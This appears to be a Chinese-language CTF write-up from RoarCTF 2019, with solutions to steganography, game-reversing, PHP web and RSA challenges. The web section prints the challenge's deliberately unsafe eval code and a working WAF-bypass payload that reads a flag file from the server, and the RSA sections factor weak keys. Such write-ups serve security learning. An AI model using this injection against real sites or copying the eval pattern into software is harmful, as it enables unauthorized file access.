---
layout: post
title:  "RoarCTF2019-Writeup"
date:   2019-10-13
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# RoarCTF2019-Writeup

* ### 黄金六年

  视频，16进制查看，最后有一段base64，解码得到一个加密压缩包

  逐帧看视频，可以找到二维码，扫码得到压缩包密码，解压得到flag

  

* ### 坦克

  win函数中text加上地图状态转化的字符串，计算sha1与预设值相同出flag
  
  地图状态
  
  0鸟 1砖 2石头 3敌人 4水 5草 6边界 8空地 9被打爆的鸟
  
  进入win函数需要nDestroyNum为4或5，摧毁砖块或鸟nDestroyNum+1
  
  爆破，遍历摧毁 4墙/1鸟3墙/5墙/1鸟4墙 的情况
  
* ### calc

  ```php
  <?php 
  error_reporting(0); 
  if(!isset($_GET['num'])){ 
      show_source(__FILE__); 
  }else{ 
          $str = $_GET['num']; 
          $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^']; 
          foreach ($blacklist as $blackitem) { 
                  if (preg_match('/' . $blackitem . '/m', $str)) { 
                          die("what are you want to do?"); 
                  } 
          } 
          eval('echo '.$str.';'); 
  } 
  ?> 
  ```

  传入字母出Forbidden，num前加空格可以绕过

  然后白给

  ```
  calc.php?%20num=ls;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
  ```

* ### RSA

  ```python
  A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x
  p=next_prime(z*x*y)
  q=next_prime(z)
  A =  2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724
  n =  117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127
  c =  74787643571083387506782798647837190437986187566898207407975212027458147382367711911812375920005113364563084944058626573362415213340732334924596203811015603705197933527220233310567791143957629113041617160438948759036070430128878642065994878749552245283871744136598679680859474057272762874695824234852628699143847120107269353386206556949252718131920398948350334287735566486652091980351487364013798894021457252316205146843330237859028943572169115310051317165142070538562385275320469575470921449008326973403599105685256458196148281329435888565346721147567733142575617385258467453890746333147258890252953170152479246628
  ```

  根据A求x，y

  $2^{2019}>A$ ，所以(((y%x)**5)%(x%y))=1

  A减去一个数可开316次方，x，y不大，爆破得到这个数，然后计算x，y

  ```python
  for i in range(0xfffff):
  	if i % 100000 == 0:
  		print(i)
  	if gmpy2.iroot(A-i,316)[1]==True:
  		print(i)
  		print(gmpy2.iroot(A-i,316)[0])
  		break
  
  i = 43
  y = 83
  x = 2
  ```

  然后求z

  根据next_prime(z)-z<10000

  所以

  $p<10000+166z$

  $q<10000+z$

  设$p=a+166z,q=b+z$

  $p*q=(a+166z)(b+z)=n$

  爆破a,b，有整数解时可解出z

  ```python
  for a in range(0,10000):
  	if a % 1000 == 0:
  		print(a)
  	for b in range(0,10000):
  		fuck = (166*b+a)**2 - 4*166*(a*b-n)
  		if gmpy2.iroot(fuck,2)[1]==True:
  			x = gmpy2.iroot(fuck,2)[0]-(166*b+a)
  			print(gmpy2.gcd(x,166))
  			if x%(166*2) == 0:
  				print(gmpy2.iroot(fuck,2))
  				print(a,b)
  				print(x/(166*2))
  ```

  根据z求pq，解c

  ```python
  p=nextprime((z)*x*y)
  q=nextprime((z))
  if p*q==n:
  	print(p)
  	print(q)
  
  p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183
  q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569
  c =  74787643571083387506782798647837190437986187566898207407975212027458147382367711911812375920005113364563084944058626573362415213340732334924596203811015603705197933527220233310567791143957629113041617160438948759036070430128878642065994878749552245283871744136598679680859474057272762874695824234852628699143847120107269353386206556949252718131920398948350334287735566486652091980351487364013798894021457252316205146843330237859028943572169115310051317165142070538562385275320469575470921449008326973403599105685256458196148281329435888565346721147567733142575617385258467453890746333147258890252953170152479246628
  print(p*q==n)
  phin = (p-1)*(q-1)
  
  #guess e = 65537
  e=65537
  d = gmpy2.invert(e,phin)
  m = pow(c,d,n)
  p = hex(m)[2:].strip('L')
  if len(p)%2 == 1:
  	p = '0'+p
  if 'CTF' in p.decode('hex'):
  	print(p.decode('hex'))
  ```

* ### babyrsa

  ```python
  import sympy
  import random
  
  def myGetPrime():
      A= getPrime(513)
      print(A)
      B=A-random.randint(1e3,1e5)
      print(B)
      return sympy.nextPrime((B!)%A)
  p=myGetPrime()
  A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407
  B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596
  
  q=myGetPrime()
  A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927
  B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026
  
  r=myGetPrime()
  
  n=p*q*r
  #n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733
  c=pow(flag,e,n)
  #e=0x1001
  #c=65669738259956193152137899174049847462495016858239424115871354058526815000923451927138381917740393091388382103048930294669378204005488753858176168508082409402675645254753472158733328702151755559380642016251437844181309301474393977753462490799014770286934148130639135186607801014969040037522071972282801884880089523319028620671520971103365275848613335949197149661408042560524107114105126919377503270365243217821644517712076054602321987781198396807717434025338864
  #so,what is the flag?
  ```

  关键点(B!)%A，A,B白给，求出(B!)%A就完事了

  快速阶乘取模，sympy真香

  ```python
  from sympy import *
  import gmpy2
  
  A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407
  B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596
  A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927
  B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026
  n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733
  
  e=0x1001
  c=65669738259956193152137899174049847462495016858239424115871354058526815000923451927138381917740393091388382103048930294669378204005488753858176168508082409402675645254753472158733328702151755559380642016251437844181309301474393977753462490799014770286934148130639135186607801014969040037522071972282801884880089523319028620671520971103365275848613335949197149661408042560524107114105126919377503270365243217821644517712076054602321987781198396807717434025338864
  
  fuck1 = Mod(factorial(B1, evaluate=False),A1)
  fuck2 = Mod(factorial(B2, evaluate=False),A2)
  #print(fuck1)
  #print(fuck2)
  p = nextprime(fuck1)
  q = nextprime(fuck2)
  print(p)
  print(q)
  r = n/p/q
  
  phin = (p-1)*(q-1)*(r-1)
  d = gmpy2.invert(e,phin)
  m = pow(c,d,n)
  p = hex(m)[2:].strip('L')
  if len(p)%2 != 0:
  	p = '0' + p
  #print(p)
  print(p.decode('hex'))
  ```

  

  